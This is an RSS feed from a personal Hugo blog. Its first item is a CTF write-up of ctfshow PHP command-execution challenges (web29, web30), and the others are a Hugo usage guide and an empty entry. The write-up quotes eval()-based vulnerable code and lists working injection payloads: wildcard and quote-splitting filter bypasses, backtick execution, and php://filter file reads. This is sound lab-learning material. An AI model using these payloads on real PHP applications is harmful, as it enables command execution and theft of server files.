<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on LHY&#39;bolgs</title>
    <link>https://hzlhy.github.io/post/</link>
    <description>Recent content in Posts on LHY&#39;bolgs</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 25 Feb 2021 22:44:08 +0800</lastBuildDate><atom:link href="https://hzlhy.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Ctfshow_webrm29_124</title>
      <link>https://hzlhy.github.io/post/ctfshow_webrm29_124/</link>
      <pubDate>Thu, 25 Feb 2021 22:44:08 +0800</pubDate>
      
      <guid>https://hzlhy.github.io/post/ctfshow_webrm29_124/</guid>
      <description>ctfshow web 入门命令执行 web29 &amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;c&amp;#39;])){ $c = $_GET[&amp;#39;c&amp;#39;]; if(!preg_match(&amp;#34;/flag/i&amp;#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：通配符； 看到有eval()执行函数 过滤了flag ，可以使用通配符进行绕过。所以payload为：c=system(&#39;cat f*&#39;);返回的flag进行了隐藏，右键查看源码即可。 也可以通过文件包含来解决，payload： 先传入?c=echo &amp;quot;lhy&amp;quot;;?&amp;gt;ctfshow &amp;lt;?php system(&#39;ls&#39;);看到有flag.php文件（前面需要echo &amp;ldquo;lhy&amp;rdquo;;?&amp;gt;是因为传入c的时候表示一段代码的开始，?&amp;gt;结束后开始执行后面的代码），接下来的为?c=echo &amp;quot;lhy&amp;quot;; ?&amp;gt;ctfshow &amp;lt;?php include($_GET[&#39;url&#39;]);&amp;amp;url=php://filter/read=convert.base64-encode/resource=flag.php 补充：对于linux cat 和ca&#39;&amp;rsquo;t ca\t ca&amp;quot;&amp;ldquo;t效果是相同的，这样可以绕过字符的限制，如c=system(&#39;ca\t fla\g.php&#39;);
web30 &amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;c&amp;#39;])){ $c = $_GET[&amp;#39;c&amp;#39;]; if(!preg_match(&amp;#34;/flag|system|php/i&amp;#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：反引号执行系统命令； 与29相比增加了对命令函数的过滤，命令执行函数有很多，如 system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号
只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`;
payload2:?c=passthru(&amp;quot;cat f*&amp;quot;);
还可以采用文件包含：
payload3:?c=echo &amp;quot;lhy &amp;quot;; include($_GET[&#39;url&#39;]); ?</description>
    </item>
    
    <item>
      <title>hugo使用</title>
      <link>https://hzlhy.github.io/post/hugo_use/</link>
      <pubDate>Sat, 16 Jan 2021 01:33:06 +0800</pubDate>
      
      <guid>https://hzlhy.github.io/post/hugo_use/</guid>
      <description>hugo使用方法（初步） 一、创建站点 使用 hugo new site &amp;quot;文件夹名字&amp;quot;，如 hugo new site blogs 就会创建一个名为blogs的文件夹，包含archetypes、content等文件夹。
二、创建与保存文章 1.使用 hugo new xxx.md 创建一个名为 xxx.md 的文件，这样会直接将该文件创建于content文件夹中； 使用 hugo new post/xxx.md 会在 content 中的post文件夹中创建 xxx.md 文件。（注：在编辑文章时一定要把draft: true ——&amp;gt;draft: false,这样在生成时才会把文章生成到post文件夹中） 2.在完成创建后，运行 hugo 命令会生成相应的文件到public文件夹中；运行 hugo server 命令可以在本地 localhost:1313 查看变化（调试）。 3.完成修改后需要上传到GitHub仓库，把 public 文件夹里面的内容全部复制到本地仓库中,然后通过GitHub desktop同步到GitHub，如下图： 三、标签与目录、侧栏 1.侧栏显示文章，在创建文章时把 menu: &amp;ldquo;main&amp;rdquo; 加上即可。 2.在创建文章时把 Categories: &amp;ldquo;CTF&amp;rdquo;\Tags: &amp;ldquo;web&amp;rdquo; 补上可以为文章标注目录和标签，如上述例子就表示该文章为CTF目录中标签为web的文章。 3.在侧栏显示目录与标签或者友情链接，需要在 config.toml 中修改，如下列语句：
[Menus] main = [ {Name = &amp;quot;Categories&amp;quot;, URL = &amp;quot;https://hzlhy.github.io/categories/&amp;quot;}, {Name = &amp;quot;Tags&amp;quot;, URL = &amp;quot;https://hzlhy.</description>
    </item>
    
    <item>
      <title>Xctf_PHP2</title>
      <link>https://hzlhy.github.io/post/xctf_php2/</link>
      <pubDate>Sat, 16 Jan 2021 00:29:32 +0800</pubDate>
      
      <guid>https://hzlhy.github.io/post/xctf_php2/</guid>
      <description></description>
    </item>
    
  </channel>
</rss>
